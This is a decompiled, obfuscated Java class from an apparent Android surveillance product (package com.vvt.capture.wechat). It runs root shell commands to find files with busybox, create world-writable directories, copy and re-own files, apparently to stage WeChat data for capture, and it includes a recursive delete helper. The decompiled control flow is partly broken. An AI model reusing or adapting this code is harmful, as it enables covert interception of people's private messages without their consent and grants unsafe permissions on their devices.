package com.vvt.capture.wechat.b;

import com.vvt.ag.b;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;

public class d
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static String a(String paramString)
  {
    return p.a(paramString, "busybox");
  }
  
  public static String a(String paramString1, String paramString2)
  {
    return p.a(paramString1, paramString2);
  }
  
  public static String a(String paramString1, String paramString2, String paramString3)
  {
    boolean bool1 = a;
    if (bool1) {}
    String str1 = a(paramString1);
    String str2 = "%s find %s -type f -name '%s'";
    int j = 3;
    Object[] arrayOfObject = new Object[j];
    arrayOfObject[0] = str1;
    arrayOfObject[1] = paramString2;
    int i = 2;
    arrayOfObject[i] = paramString3;
    str1 = String.format(str2, arrayOfObject);
    boolean bool4 = a;
    if (bool4) {}
    bool4 = false;
    str2 = null;
    for (;;)
    {
      try
      {
        str1 = KMShell.a(str1);
        boolean bool3 = a;
        if (bool3) {}
        bool3 = b.a(str1);
        if (!bool3)
        {
          bool3 = ShellUtil.b(str1);
          if (bool3)
          {
            bool4 = a;
            if (bool4) {}
            return str1;
          }
        }
        bool2 = c;
        if (!bool2) {}
      }
      catch (KMShell.ShellException localShellException)
      {
        boolean bool2 = c;
        if (!bool2) {
          continue;
        }
        continue;
      }
      bool2 = false;
      str1 = null;
    }
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str = null;
    bool = ShellUtil.b(paramString1);
    if (bool) {}
    for (;;)
    {
      try
      {
        Object localObject = new java/io/File;
        ((File)localObject).<init>(paramString2);
        bool = ((File)localObject).exists();
        if (!bool)
        {
          localObject = "mkdir %s; chmod 777 %s; chown %s.%s %s";
          i = 5;
          arrayOfObject = new Object[i];
          j = 0;
          arrayOfObject[0] = paramString2;
          j = 1;
          arrayOfObject[j] = paramString2;
          j = 2;
          arrayOfObject[j] = paramString4;
          j = 3;
          arrayOfObject[j] = paramString4;
          j = 4;
          arrayOfObject[j] = paramString2;
          localObject = String.format((String)localObject, arrayOfObject);
          KMShell.a((String)localObject);
          bool = com.vvt.aa.a.c();
          if (bool) {
            ShellUtil.k(paramString2);
          }
        }
        localObject = new java/io/File;
        ((File)localObject).<init>(paramString1);
        localObject = ((File)localObject).getName();
        str = p.a(paramString2, (String)localObject);
        localObject = "%s cp %s %s; chmod 755 %s";
        int i = 4;
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        arrayOfObject[0] = paramString3;
        j = 1;
        arrayOfObject[j] = paramString1;
        j = 2;
        arrayOfObject[j] = str;
        j = 3;
        arrayOfObject[j] = str;
        localObject = String.format((String)localObject, arrayOfObject);
        KMShell.a((String)localObject);
        localObject = "chown %s.%s %s";
        i = 3;
        arrayOfObject = new Object[i];
        j = 0;
        arrayOfObject[0] = paramString4;
        j = 1;
        arrayOfObject[j] = paramString4;
        j = 2;
        arrayOfObject[j] = str;
        localObject = String.format((String)localObject, arrayOfObject);
        KMShell.a((String)localObject);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k(str);
        }
        bool = a;
        if (!bool) {}
      }
      catch (Exception localException)
      {
        bool = c;
        if (!bool) {
          continue;
        }
        continue;
      }
      return str;
      bool = b;
      if (!bool) {}
    }
  }
  
  static void b(String paramString)
  {
    bool = a;
    if (bool) {}
    String str = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = paramString;
      str = String.format(str, arrayOfObject);
      KMShell.a(str);
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/wechat/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */